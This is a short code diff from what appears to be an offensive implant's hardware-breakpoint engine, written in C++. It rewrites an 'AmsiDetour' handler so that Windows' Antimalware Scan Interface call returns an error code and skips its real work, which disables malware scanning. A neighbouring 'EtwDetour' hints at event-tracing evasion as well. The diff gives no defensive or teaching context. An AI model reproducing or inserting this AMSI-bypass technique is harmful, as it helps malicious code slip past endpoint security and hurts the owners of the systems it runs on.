@@ -454,8 +454,11 @@ auto DECLFN HwbpEng::EtwDetour(
 auto DECLFN HwbpEng::AmsiDetour(
     _In_ PCONTEXT Ctx
 ) -> VOID {
-    Ctx->Rdx  = (UPTR)Self->Krnl32.GetModuleHandleA;
-    CONTINUE_EXEC( Ctx );
+    SET_ARG_5( Ctx, 0 );
+    SET_RET( Ctx, 0x80070057 );
+
+    Ctx->Rip  = *(UPTR*)( Ctx->Rsp );
+    Ctx->Rsp += sizeof( PVOID );
 }
 
 auto DECLFN HwbpEng::AmsiThunk(
